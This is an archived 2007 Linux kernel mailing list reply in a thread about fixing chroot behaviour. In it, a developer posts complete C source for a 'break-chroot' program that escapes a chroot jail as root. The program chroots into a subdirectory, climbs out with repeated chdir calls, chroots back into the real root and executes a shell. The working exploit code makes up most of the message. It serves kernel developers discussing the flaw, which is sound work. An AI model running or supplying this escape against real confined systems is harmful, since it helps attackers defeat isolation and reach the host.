Return-Path: <linux-kernel-owner+w=401wt.eu-S1757236AbXIZKDd@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1757236AbXIZKDd (ORCPT <rfc822;w@1wt.eu>);
	Wed, 26 Sep 2007 06:03:33 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1754687AbXIZKD0
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Wed, 26 Sep 2007 06:03:26 -0400
Received: from box.memset.com ([89.200.136.113]:54741 "EHLO box.memset.com"
	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
	id S1754332AbXIZKDZ (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
	Wed, 26 Sep 2007 06:03:25 -0400
X-Greylist: delayed 1505 seconds by postgrey-1.27 at vger.kernel.org; Wed, 26 Sep 2007 06:03:25 EDT
To: linux-kernel@vger.kernel.org
Cc: Al Viro <viro@ftp.linux.org.uk>
Subject: Re: sys_chroot+sys_fchdir Fix
In-Reply-To: <97sX2-p1-3@gated-at.bofh.it>
References: <952DN-83o-31@gated-at.bofh.it> <954cl-29C-3@gated-at.bofh.it> <95ctn-74b-15@gated-at.bofh.it> <95cMH-7um-19@gated-at.bofh.it> <95gdA-4OZ-7@gated-at.bofh.it> <95UE2-1oR-19@gated-at.bofh.it> <95V72-2ly-17@gated-at.bofh.it> <97pG8-3B5-47@gated-at.bofh.it> <97sX2-p1-3@gated-at.bofh.it>
Date: Wed, 26 Sep 2007 10:38:17 +0100
Message-Id: <20070926093818.33A8014C2BF@irishsea.home.craig-wood.com>
From: nick@craig-wood.com (Nick Craig-Wood)
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

Al Viro <viro@ftp.linux.org.uk> wrote:
>  If you are within chroot jail and capable of chroot(), you can chdir to
>  its root, then chroot() to subdirectory and you've got cwd outside of
>  your new root.  After that you can chdir all way out to original
>  root.

Here is some code I wrote a while back to demonstrate that escape
method.

/*
 *  Break a chroot
 *
 *  Compile this with
 *
 *     gcc -static -Wall break-chroot.c -o break-chroot
 *
 *  Get a root shell in the chrooted environment and run
 *
 *    ./break-chroot
 *
 *  Nick Craig-Wood <nick@craig-wood.com>
 *
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <error.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>

#define SHELL "bin/sh"		/* no leading / */

int main(void)
{
    struct stat buf;
    if (chdir("/"))
	perror("chdir /"), exit(1);

    printf("Making escape tunnel\n");
    mkdir("/tmp", 01777);
    mkdir("/tmp/escape-tunnel", 0755);

    printf("Doing escape chroot leaving cwd behind\n");
    if (chroot("/tmp/escape-tunnel"))
	perror("chroot /tmp/escape-tunnel"), exit(1);

    printf("Exploit cwd being above the root and find a " SHELL " to run\n");
    do {
	printf("Going up...\n");
	if (chdir("../"))
	    perror("chdir ../"), exit(1);
    } while (stat(SHELL, &buf) != 0);

    printf("Chrooting back into the root directory\n");
    if (chroot("."))
	perror("chroot ."), exit(1);

    printf("If this doesn't error you are out of chroot!\n");
    if (execl(SHELL, SHELL, 0))
	perror("exec " SHELL), exit(1);

    printf("Something wicked happened!\n");
    return 1;
}

-- 
Nick Craig-Wood <nick@craig-wood.com> -- http://www.craig-wood.com/nick
